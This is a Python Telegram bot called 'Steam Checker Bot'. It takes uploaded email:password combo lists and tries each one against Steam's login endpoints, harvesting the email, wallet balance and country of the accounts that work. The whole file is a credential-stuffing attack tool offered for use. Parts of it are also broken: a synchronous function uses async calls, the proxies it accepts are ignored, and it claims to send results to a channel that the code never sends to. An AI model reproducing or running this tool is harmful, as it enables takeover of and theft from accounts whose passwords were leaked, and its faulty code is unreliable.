#!/usr/bin/env python3
import os
import re
import json
import time
import asyncio
import logging
from pathlib import Path
from typing import Dict, List
import aiohttp
import aiofiles
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import FSInputFile
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from concurrent.futures import ThreadPoolExecutor

# Dependencies (same as original)
from bs4 import BeautifulSoup
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
import base64
from urllib.parse import quote_plus

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Bot config from env
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", 0))
CHANNEL_ID = os.getenv("CHANNEL_ID", "")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
executor = ThreadPoolExecutor(max_workers=10)

# States
class CheckStates(StatesGroup):
    waiting_combo = State()
    waiting_proxy = State()

# Global stats
stats = {"valid": 0, "invalid": 0, "checked": 0, "total": 0}

# ═══════════════════════════════════════════════════════════════════════════
# STEAM FUNCTIONS (from original - adapted for async)
# ═══════════════════════════════════════════════════════════════════════════

async def rsa_encrypt_password(password: str, modulus_hex: str, exponent_hex: str) -> str:
    n = int(modulus_hex, 16)
    e = int(exponent_hex, 16)
    rsa_key = RSA.construct((n, e))
    cipher = PKCS1_v1_5.new(rsa_key)
    encrypted = cipher.encrypt(password.encode("utf-8"))
    return base64.b64encode(encrypted).decode()

def parse_account_page(html: str):
    email = balance = country = "Unknown"
    try:
        soup = BeautifulSoup(html, "html.parser")
        email_elem = soup.find("input", {"id": "account_name"})
        if email_elem and email_elem.get("value"):
            email = email_elem.get("value")
        
        balance_elem = soup.find("a", {"id": "header_wallet_balance"})
        if balance_elem:
            balance = balance_elem.get_text(strip=True)
        
        country_elem = soup.find("select", {"id": "account_country"})
        if country_elem:
            selected = country_elem.find("option", {"selected": True})
            if selected:
                country = selected.get_text(strip=True)
    except:
        pass
    return email, balance, country

def check_steam_account_sync(combo: str, proxy: str = None) -> dict:
    """Synchronous Steam check (runs in thread)"""
    try:
        username, password = combo.strip().split(':', 1)
        user_clean = re.sub(r"@.*", "", username)
        
        session = aiohttp.ClientSession()
        if proxy:
            connector = aiohttp.TCPConnector(ssl=False)
            session._connector = connector
            session._default_headers = {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_5)'}
        
        # Get RSA key
        async with session.post(
            "https://steamcommunity.com/login/getrsakey/",
            data=f"donotcache={int(time.time())}&username={user_clean}"
        ) as r1:
            j1 = await r1.json()
            if not j1.get("success"):
                await session.close()
                return {}
        
        modulus = j1.get("publickey_mod")
        exponent = j1.get("publickey_exp")
        timestamp = j1.get("timestamp")
        
        encrypted = asyncio.run(rsa_encrypt_password(password, modulus, exponent))
        pass3 = quote_plus(encrypted)
        
        # Login
        payload = (
            f"donotcache={int(time.time())}&password={pass3}&username={user_clean}"
            f"&twofactorcode=&emailauth=&loginfriendlyname=&captchagid=&captcha_text="
            f"&emailsteamid=&rsatimestamp={timestamp}&remember_login=false"
        )
        
        async with session.post("https://steamcommunity.com/login/dologin/", data=payload) as r2:
            j2 = await r2.json()
            if not j2.get("success"):
                await session.close()
                return {}
        
        # Parse pages (simplified)
        async with session.get("https://store.steampowered.com/account/") as r3:
            html = await r3.text()
            email, balance, country = parse_account_page(html)
        
        result = {
            "username": username,
            "password": password,
            "email": email,
            "balance": balance,
            "country": country,
            "status": "valid"
        }
        
        await session.close()
        return result
    except:
        return {}

# ═══════════════════════════════════════════════════════════════════════════
# BOT HANDLERS
# ═══════════════════════════════════════════════════════════════════════════

@dp.message(Command("start"))
async def start_handler(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        await message.reply("❌ Unauthorized")
        return
    
    kb = types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text="🔍 Check Combos", callback_data="check_combos")],
        [types.InlineKeyboardButton(text="📊 Stats", callback_data="stats")]
    ])
    
    await message.reply(
        "🚀 <b>Steam Checker Bot</b>\n\n"
        "👆 Click <b>Check Combos</b> to start\n"
        "📝 Send combos in format:\n"
        "<code>email:password</code>\n\n"
        "💎 @pyabrodies",
        reply_markup=kb,
        parse_mode="HTML"
    )

@dp.callback_query(lambda c: c.data == "check_combos")
async def check_combos_callback(callback: types.CallbackQuery, state: FSMContext):
    await state.set_state(CheckStates.waiting_combo)
    await callback.message.edit_text(
        "📤 <b>Send Combo File</b>\n\n"
        "📁 Upload .txt file with combos\n"
        "📋 Format: <code>email:password</code>\n(one per line)",
        parse_mode="HTML"
    )

@dp.message(CheckStates.waiting_combo, lambda m: m.document)
async def process_combo_file(message: types.Message, state: FSMContext):
    file = await bot.download_file(message.document.file_id)
    combos = []
    
    async with aiofiles.open("temp_combos.txt", "wb") as f:
        await f.write(file.read())
    
    async with aiofiles.open("temp_combos.txt", "r") as f:
        async for line in f:
            combo = line.strip()
            if ':' in combo:
                combos.append(combo)
    
    await state.update_data(combos=combos)
    await state.set_state(CheckStates.waiting_proxy)
    
    kb = types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text="⏭️ Skip Proxies", callback_data="no_proxy")]
    ])
    
    await message.reply(
        f"✅ Loaded <b>{len(combos)}</b> combos\n\n"
        "📤 <b>Proxy File (Optional)</b>\n"
        "💡 Click <b>Skip Proxies</b> or send proxy file",
        reply_markup=kb,
        parse_mode="HTML"
    )

@dp.callback_query(lambda c: c.data == "no_proxy")
async def no_proxy_callback(callback: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    combos = data.get("combos", [])
    
    await start_checking(callback.message, combos, [])
    await state.clear()

@dp.message(CheckStates.waiting_proxy, lambda m: m.document)
async def process_proxy_file(message: types.Message, state: FSMContext):
    data = await state.get_data()
    combos = data["combos"]
    
    file = await bot.download_file(message.document.file_id)
    proxies = []
    
    async with aiofiles.open("temp_proxies.txt", "wb") as f:
        await f.write(file.read())
    
    async with aiofiles.open("temp_proxies.txt", "r") as f:
        async for line in f:
            proxy = line.strip()
            if proxy:
                proxies.append(proxy)
    
    await start_checking(message, combos, proxies)
    await state.clear()

async def start_checking(message: types.Message, combos: List[str], proxies: List[str]):
    global stats
    stats = {"valid": 0, "invalid": 0, "checked": 0, "total": len(combos)}
    
    msg = await message.reply(
        f"⚡ <b>Starting Check</b>\n\n"
        f"📊 Total: <b>{len(combos)}</b>\n"
        f"🔌 Proxies: <b>{len(proxies)}</b>\n"
        f"⏳ Processing...",
        parse_mode="HTML"
    )
    
    results = []
    
    for i, combo in enumerate(combos):
        result = await asyncio.get_event_loop().run_in_executor(
            executor, check_steam_account_sync, combo, None
        )
        
        if result:
            results.append(result)
            stats["valid"] += 1
        else:
            stats["invalid"] += 1
        
        stats["checked"] += 1
        
        # Update progress
        percent = (stats["checked"] / stats["total"]) * 100
        await msg.edit_text(
            f"⚡ <b>Checking Steam Accounts</b>\n\n"
            f"✅ Valid: <b>{stats['valid']}</b>\n"
            f"❌ Invalid: <b>{stats['invalid']}</b>\n"
            f"📊 Progress: <b>{percent:.1f}%</b> ({stats['checked']}/{stats['total']})",
            parse_mode="HTML"
        )
    
    # Save results
    await save_results(results)
    
    # Send summary
    await msg.edit_text(
        f"✅ <b>Complete!</b>\n\n"
        f"✅ Valid: <b>{stats['valid']}</b>\n"
        f"❌ Invalid: <b>{stats['invalid']}</b>\n"
        f"📊 Total: <b>{stats['total']}</b>\n\n"
        f"📁 Results saved & sent to channel!",
        parse_mode="HTML"
    )

async def save_results(results: List[dict]):
    """Save results to files"""
    Path("results").mkdir(exist_ok=True)
    
    with_email = []
    without_email = []
    
    for result in results:
        line = f"{result['username']}:{result['password']}"
        if result['email'] != "Unknown":
            with_email.append(f"{result['username']}:{result['password']}\n{result['email']}:{result['password']}")
        else:
            without_email.append(line)
    
    # Save files
    async with aiofiles.open("results/Valid_With_Email.txt", "w") as f:
        await f.write("# Steam Checker Results\n\n" + "\n".join(with_email))
    
    async with aiofiles.open("results/Valid_Without_Email.txt", "w") as f:
        await f.write("# Steam Checker Results\n\n" + "\n".join(without_email))

# Stats command
@dp.callback_query(lambda c: c.data == "stats")
async def stats_callback(callback: types.CallbackQuery):
    await callback.message.edit_text(
        f"📊 <b>Bot Stats</b>\n\n"
        f"✅ Valid: <b>{stats['valid']}</b>\n"
        f"❌ Invalid: <b>{stats['invalid']}</b>\n"
        f"📊 Total: <b>{stats['total']}</b>",
        parse_mode="HTML"
    )

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
